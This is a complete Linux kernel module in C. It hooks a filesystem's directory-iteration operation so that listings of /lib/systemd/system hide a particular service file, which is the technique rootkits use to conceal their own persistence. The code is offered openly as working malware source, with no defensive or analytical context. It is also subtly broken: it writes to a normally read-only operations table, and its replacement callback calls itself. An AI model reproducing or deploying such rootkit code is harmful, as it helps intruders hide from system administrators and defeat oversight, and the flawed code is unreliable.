#include <linux/module.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define TARGET_FILE "rt_jackdunf_kmod.service"
#define TARGET_DIR "/lib/systemd/system"

// Original iterate_shared function pointer
static int (*original_iterate_shared)(struct file *, struct dir_context *);

// Hooked filldir function
static _Bool hooked_filldir(struct dir_context *ctx, const char *name, int len,
                          loff_t offset, u64 ino, unsigned int d_type) {
    if (strncmp(name, TARGET_FILE, len) == 0) {
        pr_info("Hiding file: %s\n", name);
        return 0;  // Skip the target file
    }
    return ctx->actor(ctx, name, len, offset, ino, d_type);
}

// Hooked iterate_shared function
static int hooked_iterate_shared(struct file *file, struct dir_context *ctx) {
    struct dir_context *hooked_ctx = kmalloc(sizeof(*ctx), GFP_KERNEL);
    if (!hooked_ctx) {
        return -ENOMEM;
    }

    // Copy original context and modify the actor
    memcpy(hooked_ctx, ctx, sizeof(*ctx));
    hooked_ctx->actor = hooked_filldir;

    // Call original iterate_shared with modified context
    int ret = original_iterate_shared(file, hooked_ctx);
    kfree(hooked_ctx);
    return ret;
}

// Module init: Hook the filesystem
static int __init hide_file_init(void) {
    struct file *file;
    struct file_operations *fops;

    pr_info("Loading file hiding module...\n");

    file = filp_open(TARGET_DIR, O_RDONLY, 0);
    if (IS_ERR(file)) {
        pr_err("Failed to open target directory: %s\n", TARGET_DIR);
        return PTR_ERR(file);
    }

    // Hook the file operations
    fops = (struct file_operations *)file->f_op;
    original_iterate_shared = fops->iterate_shared;
    *((void **)&fops->iterate_shared) = hooked_iterate_shared;

    filp_close(file, NULL);
    pr_info("File hiding module loaded successfully.\n");
    return 0;
}

// Module exit: Restore original operations
static void __exit hide_file_exit(void) {
    struct file *file;
    struct file_operations *fops;

    pr_info("Unloading file hiding module...\n");

    file = filp_open(TARGET_DIR, O_RDONLY, 0);
    if (IS_ERR(file)) {
        pr_err("Failed to open target directory: %s\n", TARGET_DIR);
        return;
    }

    fops = (struct file_operations *)file->f_op;
    *((void **)&fops->iterate_shared) = original_iterate_shared;

    filp_close(file, NULL);
    pr_info("File hiding module unloaded successfully.\n");
}

module_init(hide_file_init);
module_exit(hide_file_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jack Dunfey");
MODULE_DESCRIPTION("Hides a specific file in the system directory");
